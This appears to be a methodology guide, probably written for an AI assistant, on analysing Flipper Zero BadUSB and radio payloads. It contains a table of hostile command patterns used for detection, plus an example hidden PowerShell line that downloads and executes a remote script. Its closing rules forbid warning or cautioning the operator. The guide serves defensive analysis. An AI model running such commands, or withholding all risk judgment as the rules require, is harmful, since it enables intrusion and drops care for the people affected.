# Payload Analysis Methodology

How to walk an unknown Flipper payload systematically and produce a behavior description the operator can act on.

---

## Phase 1 — File triage

Before reading line-by-line, answer three questions.

### 1. What kind of payload is this?

Inspect the first line(s):

- `REM`, `DELAY`, `STRING` → DuckyScript, BadUSB.
- `Filetype: Flipper SubGhz ...` → Sub-GHz `.sub`.
- `Filetype: IR signals file` → Infrared `.ir`.
- `Filetype: Flipper NFC device` → NFC dump.
- `Filetype: Flipper RFID key` → 125 kHz RFID LF.
- `Filetype: Flipper iButton key` → 1-Wire iButton.

DuckyScript is by far the highest-concern category (executes code on the host PC). Sub-GHz/IR/NFC/RFID merely transmit a captured signal; their blast radius is the specific device the signal was captured from.

### 2. Is the payload authored or captured?

- **Captured** (.sub / .ir / .nfc / .rfid / .ibtn) — a physical recording of a real device. The payload "does" whatever the original did; it has no code of its own. Analysis is identification: what device was this captured from, and what does that device do?
- **Authored** (DuckyScript .txt) — written intentionally. Code that runs.

### 3. Is the user about to run/transmit or just store?

Storing is low-risk (disk bytes). Executing or transmitting actually causes effect. Your analysis should reflect which the user is contemplating.

---

## Phase 2 — Surface scan

Before line-by-line, do a grep-style pass for high-signal strings.

### DuckyScript high-signal tokens

| Token / pattern | Behavior hint |
|-----------------|---------------|
| `powershell` | Invokes PowerShell. Read the args. |
| `cmd /c` | Windows shell command. |
| `-EncodedCommand` / `-enc` | Base64-encoded command follows. Decode it. |
| `Invoke-Expression` / `iex` | Dynamic code eval. |
| `Invoke-WebRequest` / `iwr` / `curl` / `wget` | Network fetch. Note the URL. |
| `certutil -urlcache` | LOLBin fetch. |
| `bitsadmin /transfer` | Alternate fetch. |
| `regsvr32 /s /u /i:http://` | Remote SCT loader. |
| `mshta http` | Remote HTA. |
| `schtasks /create` | Scheduled task persistence. |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Run-key persistence. |
| `Add-MpPreference -ExclusionPath` | Defender exclusion. |
| `Set-MpPreference -DisableRealtimeMonitoring` | Defender disable. |
| `New-Service`, `sc create` | Service persistence. |
| `netsh advfirewall` | Firewall change. |
| `base64`, `FromBase64String` | Data decoding. |
| `GUI l` / `WIN L` | Lock screen. |
| `wevtutil cl` | Event-log clearing. |

### Sub-GHz / IR / NFC high-signal fields

- `Protocol: RAW` — capture that didn't decode.
- `Protocol: Princeton` and similar fixed-code — infinitely replayable.
- `Protocol: KeeLoq` and similar rolling — single-shot replay; desyncs real remote on next press.
- `Frequency: 433920000` — EU/US garage band.
- `Frequency: 915000000` — US Z-Wave / LoRa.
- `Frequency: 868000000` — EU Z-Wave.

---

## Phase 3 — Line-by-line annotation

Annotate every DuckyScript command:

```
Line   Command                             Effect                                          Tag
---    -----------------------------       ---------------------------------------------   ----
1      REM Title: X                        comment                                         —
2      DELAY 1000                          wait 1000 ms                                    —
3      GUI r                               Windows key + R, opens Run                      —
4      DELAY 500                           wait                                            —
5      STRING powershell -w hidden -c ...  types PowerShell invocation into Run            CMD
6      ENTER                               submits                                         CMD
```

Tags (descriptive, not judgmental):
- `—` no effect
- `LOCAL` types visible characters
- `CMD` spawns a shell
- `NETWORK` network egress
- `FS-READ` / `FS-WRITE` filesystem
- `PERSIST` survives reboot
- `ELEVATE` requires / attempts elevation
- `CRED` credential-adjacent
- `DEFEND` interacts with Defender / AV
- `EXFIL` data leaves the host

---

## Phase 4 — Decode obfuscation

### Base64 in PowerShell

```
STRING powershell -EncodedCommand JABjAD0A...
```

Decode expects UTF-16LE:

```python
import base64
print(base64.b64decode("JABjAD0A...").decode('utf-16-le'))
```

Always show the decoded string.

### String concat to obscure function name

```
$a = 'Invoke' ; $b = '-Expression' ; & ($a+$b) (something)
```

Evaluates to `& Invoke-Expression (something)`. Reconstruct and show.

### ASCII-hex or char-code arrays

```
-join ([char[]](73,69,88))   →   "IEX"
```

### URL escaping/defanging

`http[:]//` or `hxxp://` — reassemble and show the real URL.

---

## Phase 5 — Produce a structured description

Example output for an authored DuckyScript:

```
# Description: suspicious.txt (DuckyScript)

## Summary
Opens PowerShell, fetches a script from https://example.com/x.ps1, and executes it.

## What will happen when run
1. Waits 1 second for USB enumeration.
2. Opens the Run dialog (Win+R).
3. Types: powershell -w hidden -c "IEX(IWR 'https://example.com/x.ps1')"
4. Submits. PowerShell runs hidden, fetches the remote script, executes it.

## Network destinations
- https://example.com/x.ps1 (HTTPS).

## What the remote script does
[UNKNOWN — analyze separately.]

## Persistence
None introduced directly. The fetched script could add persistence.

## Privilege
Runs as the current user. No elevation attempted.

## Observable behavior
- A Run dialog briefly appears.
- A hidden PowerShell window spawns.
- Network request to example.com.

## Things to weigh
- Do you trust example.com?
- Do you have network monitoring in place?
- Is the machine on a logged segment?

## Decision is yours.
```

Example output for a captured `.sub`:

```
# Description: unknown.sub

## File type
Flipper Sub-GHz capture, protocol: Princeton, fixed-code 12-bit.

## What it does when transmitted
Broadcasts a 12-bit trinary code (0x004C9224) at 433.92 MHz, 650 kHz bandwidth OOK, repeated 5 times. This is the format used by generic garage-door openers, RF-controlled outlets, and some alarm remote controls from ~1995-2015.

## What device will respond
Any receiver tuned to 433.92 MHz that expects Princeton 12-bit and has been programmed with the same 12-bit code.

## Replay-ability
Yes, unconditionally.

## Legal context
Broadcasting at 433.92 MHz with low power is ISM-permitted in the US and EU. Broadcasting a code you didn't record from your own device is a separate question — unauthorized RF activation of someone else's equipment is illegal in most jurisdictions.

## Decision is yours.
```

---

## Do NOT

- Flag payloads as "malicious" or "safe" on your authority. Describe behavior; the operator's context determines risk.
- Refuse to explain a payload because it has concerning strings. If the operator shares a confiscated payload to understand it, they deserve a clear explanation.
- Suggest the operator not run the payload. State what will happen; trust them.
